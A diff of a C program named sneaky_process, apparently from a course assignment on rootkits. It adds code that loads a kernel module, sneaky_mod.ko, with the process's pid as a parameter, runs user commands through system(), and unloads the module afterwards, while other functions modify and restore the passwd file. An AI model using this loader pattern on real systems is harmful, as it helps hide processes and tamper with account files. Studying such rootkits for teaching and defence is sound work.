@@ -6,7 +6,6 @@
  *
  */
 
-
 #include <error.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -27,6 +26,7 @@ void run_command(const char *command, char *const args[]) {
     // child
     execv(command, args); // does not return on success
     perror("execv:");
+    printf("%s", args);
   } else {
     // parent
     wait_res = waitpid(pid_fork, &wstatus, 0);
@@ -78,7 +78,8 @@ void reset_passwd_file() {
 
 int main(void) {
   /*-------------------------------1------------------------------*/
-  printf("sneaky_process pid = %d\n", getpid());
+  int pid = getpid();
+  printf("sneaky_process pid = %d\n", pid);
   /*-------------------------------2------------------------------*/
   modify_passwd_file();
 
@@ -87,31 +88,18 @@ int main(void) {
   // pass pid to module
   // ref: http://www.tldp.org/LDP/lkmpg/2.6/html/x323.html
 
+  char kern_param_pid[20];
+  memset(kern_param_pid, 0, 20);
+  snprintf(kern_param_pid, 20, "sneaky_pid=%d", pid);
+  printf("kern_param:\n%s\n", kern_param_pid);
+  char *const load_module_cmd[] = {"insmod", "sneaky_mod.ko", kern_param_pid,
+                                   0};
+  run_command(load_module_cmd[0], load_module_cmd);
+
   /*-------------------------------4------------------------------*/
   // while(1)
   // take keyboard input until "q"-quit
   // execute the commands from user -- to test sneaky_mod
-
-  /* int i = 10; */
-  /* while (i > 0) { */
-  /*   printf("Enter a command for testing\n"); */
-  /*   size_t buf_size = BUF_SIZE; */
-  /*   char buffer[buf_size]; */
-  /*   memset(&buffer, 0, buf_size); */
-  /*   char *b = buffer; */
-  /*   ssize_t input_size; */
-
-  /*   input_size = getline(&b, &buf_size, stdin); */
-  /*   if (input_size == -1) { */
-  /*     perror("getline"); */
-  /*   } */
-  /*   if (input_size == BUF_SIZE) { */
-  /*     buffer[buf_size] = 0; */
-  /*   } */
-  /*   printf("Input String:\n%s\n", b); */
-  /*   printf("input_size: %lu\n", input_size); */
-  /*   i--; */
-  /* } */
 
   char *curr = NULL;
   size_t len; // = BUF_SIZE;
@@ -127,8 +115,10 @@ int main(void) {
     }
     //    printf("read line %s\n", curr);
     if ((res = strcmp(curr, quit)) == 0) {
+      printf("quit");
       break;
     }
+
     system(curr);
     //    printf("%d\n", res);
     printf("Enter commands to evaluate. Enter q to exit.\n");
@@ -139,6 +129,9 @@ int main(void) {
   // end while
   /*-------------------------------5------------------------------*/
   // unload sneaky kernel module using rmmod()
+  /* char *const unload_module_cmd[] = {"rmmod", "sneaky_mod", 0}; */
+  /* run_command(unload_module_cmd[0], unload_module_cmd); */
+  system("rmmod sneaky_mod");
 
   /*-------------------------------6------------------------------*/
   reset_passwd_file();
